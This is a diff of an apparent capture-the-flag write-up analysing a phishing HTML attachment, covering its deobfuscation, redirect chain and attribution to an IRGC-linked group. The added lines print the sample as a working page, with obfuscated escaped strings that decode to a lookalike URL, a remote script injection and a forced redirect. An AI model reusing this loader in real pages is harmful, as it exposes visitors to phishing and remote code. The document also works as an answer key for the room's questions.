@@ -168,32 +168,68 @@ did here.
 ### What is the hidden message the attacker left in the file?
 From the previous task already, we discovered some variables with obfuscated content and
 now we aim for its decryption to find out the hidden message.
-```
-var xanthium = [
-  "\u0032\u0038\u0030\u0038\u003a",              
-  "\u006d\u006f\u0063\u002e",                          
-  "\u0032\u0033\u0034\u0032\u0033\u0065\u0077\u0063\u0033\u0031\u002d",
-  "\u0075\u006c\u0074\u0079\u0072\u0061\u0072\u0062\u0069\u0456\u006c", 
-  "\u002f\u002f\u003a\u0070\u0074\u0074\u0068"              
-];
-var egassem = [
-  "\u005e\u005e\u0020\u0073\u0065\u0069\u0072\u0061\u0072",
-  "\u0062\u0069\u006c\u0020\u006d\u006f\u0072\u0066\u0020",
-  "\u0073\u006b\u006f\u006f\u0062\u0020\u0068\u0073",
-  "\u0069\u0068\u0070\u0020\u006f\u0074\u0020",
-  "\u0065\u0076\u006f\u006c\u0020\u0049"      
-];
+```html
+<!doctype html>
+<html>
+  <body>
+    <script>
+    var xanthium = [
+      "\u0032\u0038\u0030\u0038\u003a",              
+      "\u006d\u006f\u0063\u002e",                          
+      "\u0032\u0033\u0034\u0032\u0033\u0065\u0077\u0063\u0033\u0031\u002d",
+      "\u0075\u006c\u0074\u0079\u0072\u0061\u0072\u0062\u0069\u0456\u006c", 
+      "\u002f\u002f\u003a\u0070\u0074\u0074\u0068"              
+    ];
+    var egassem = [
+      "\u005e\u005e\u0020\u0073\u0065\u0069\u0072\u0061\u0072",
+      "\u0062\u0069\u006c\u0020\u006d\u006f\u0072\u0066\u0020",
+      "\u0073\u006b\u006f\u006f\u0062\u0020\u0068\u0073",
+      "\u0069\u0068\u0070\u0020\u006f\u0074\u0020",
+      "\u0065\u0076\u006f\u006c\u0020\u0049"      
+    ];
+
+    var reversed = xanthium.join("");
+    var src = reversed.split("").reverse().join("");
+
+    var reversed = egassem.join("");
+    var mes = reversed.split("").reverse().join("");
+
+    document.body.appendChild(Object.assign(document.createElement("script"), { src: src }));
+    window.location.replace(src);
+    </script>
+  </body>
+</html>
 ```
 In the `deobfuscated_variables.js` file we now provide the steps to decrypt the content
-of the `xanthium` and `egassem` variables.
+of the `xanthium` and `egassem` variables which contain Unicode escape sequences. In it,
+we decode each UTF-16 unit into human-readable characters and concatenate them. Then, we
+can either paste the script contents into the browser console of our choice or use the
+*Node.js* command `node deobfuscated_variables.js` in our terminal. Finally, we get the
+contents of the two variables but they are reversed, which can be easily undone with
+`echo "<REV_MESSAGE>" | rev`. Note, to log the hidden message for this task and keep the
+URL in a safe place.
 
 ### Which line in the attached file is responsible for decoding the URL redirect?
+In the contents of the `library-invoice.pdf.html` file from the previous tasks, we can
+locate the line that reverses the contents of the `xanthium` variable and joins the
+characters for this task.
 
 ### What is the first URL in the redirect chain?
+Upon entering the decoded URL into the address bar of a a browser in the safe environment
+we are redirected to the `lib-service[.]com:8083` malicious site. However, for this task,
+the *Referer* URL with protocol and port number is the answer.
 
 ### What is the Threat Actor associated with this malicious file and/or URL?
+Again, we investigate the information contained in the *EML-Analysis-Report.html* try to
+access the VirusTotal links which are empty. Instead, we copy the malicious site URL
+`library.kingford.ac.uk` into the internal VirusTotal clone *TryDetectThis 2.0* [^7] and
+investigate the *Whois* data. The adversary, i.e. threat actor's name is listed above it.
 
 ### What is the main target of this Threat Actor according to MITRE?
+Since we have not heard of this adversary group before, we search for it in a search
+engine of our choice and directly land at the MITRE group overview [^8] describing this
+group. Here, we are informed of their main target and their affiliates, the government of
+Iran, specifically the *Islamic Revolutionary Guard Corps* (IRGC).
 
 [Task 5] Portal Drop
 -----------------------------------------------------------------------------------------
@@ -318,3 +354,5 @@ Answer format: Chronological, comma-separated
 [^4]: https://www.recordedfuture.com/research/behind-the-curtain-how-lumma-affiliates-operate
 [^5]: https://attack.mitre.org/techniques/T1583/001/
 [^6]: https://attack.mitre.org/techniques/T1027/
+[^7]: https://static-labs.tryhackme.cloud/apps/trydetectthis/report/lib-service.com
+[^8]: https://attack.mitre.org/groups/G0122/
